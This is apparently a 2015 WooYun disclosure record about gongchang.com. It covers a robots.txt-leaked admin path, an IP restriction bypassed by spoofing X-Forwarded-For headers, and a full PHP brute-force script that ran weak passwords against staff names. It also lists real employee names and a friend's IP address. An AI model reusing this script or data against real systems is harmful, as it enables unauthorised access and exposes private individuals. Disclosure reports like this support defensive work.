{"id": 34024, "wybug_id": "wooyun-2015-0107414", "wybug_title": "世界工厂网某系统弱口令,突破ip限制", "wybug_corp": "世界工厂网", "wybug_author": "路人甲", "wybug_date": "2015-04-13 10:15", "wybug_open_date": "2015-04-15 08:41", "wybug_type": "网络敏感信息泄漏", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-15：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 一朋友到这家公司去工作了,送他一个礼物第一次来wooyun啊,类型选错了帮改改,谢谢就登录进去后嘛都没干- -#怕朋友吵我 详细说明：  首先从www.gongchang.com主站入手在http://www.gongchang.com/robots.txt中泄漏了一个后台路径\nRobots.txtUser-agent: *Disallow: /d/Disallow: /e/engongchang_admin/\n打开http://www.gongchang.com/e/engongchang_admin/\n\n是帝国6.0的后台,这个版本中有不少漏洞但都是后台登录后能执行的,因为我没找到这个系统的前台页面和帝国有什么关系!随便扔进去个密码username=123password=123显示Ip(8.8.8.8) be prohibited.刚好用的是firefox装了x-forward插件ip设置的是8.8.8.8既然ip获取的是x-forward-for那就伪装ip吧打开QQ,给朋友发了个gif图片,ip就看到了(对不住了...)\n1.192.121.217\n果然\n信息提示您的用户名与密码有误，也可能您的帐号已被禁用，请重输如果您的浏览器没有自动跳转，请点击这里\n不再显示IP不被允许了这时候我跑了admin弱口令一堆没辙了...忽然想起来朋友给我发的一个国内不翻墙上google的方法的链接http://team.xizhi.com/thread-3162-1-1.html是他公司的交流论坛,但它是开放的,顿时用户名有了,总结了下上面出现的名字,结合js脚本跳转,写了个脚本,挂上弱口令跑下\n<?php   set_time_limit(0);function http($user,$pass){    $url = 'http://www.gongchang.com/e/engongchang_admin/ecmsadmin.php';      $header = array(        'CLIENT-IP:1.192.121.217',         'X-FORWARDED-FOR:1.192.121.217',     );    $data = array('username'=>$user,'password'=>$pass,'enews'=>'login','adminwindow'=>0,'imageField.x'=>46,'imageField.y'=>14);    $curl = curl_init();    curl_setopt ( $curl, CURLOPT_POST, 1 );    curl_setopt($curl,CURLOPT_HTTPHEADER,$header);    curl_setopt($curl,CURLOPT_URL,$url);    curl_setopt($curl,CURLOPT_TIMEOUT,5);      curl_setopt ($curl, CURLOPT_POSTFIELDS, $data);    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);    $r = curl_exec($curl);    curl_close($curl);    return $r;}$unames = array('王兰兰','刘建辉','李方超','孟伟','文帅营','闫艳利','金宏威','彭东江','王文官');$pfile = './pass.txt';$file = fopen($pfile,'r+');foreach($unames as $v){    while($f = fgets($file))    {        $res = http($v,trim($f));        $len = strpos($res,'\\'admin.php');        if($len){            fclose($file);            print_r('user:'.$v.'_pass:'.$f);die;        }    }}fclose($file);\n结果第一个就跑出来了\n\n超级管理员权限,\n\n如果朋友知道了这个...一定会说这个站安全上惨不忍睹,因为我的站就被他这么说过!   漏洞证明：  \n\n如上   修复方案：  ip限制严格些弱口令改改升级帝国,否则getshell很轻松   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2015-04-13 10:22 厂商回复： 感谢，稍后修复 最新状态： 2015-04-15：漏洞已修复  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}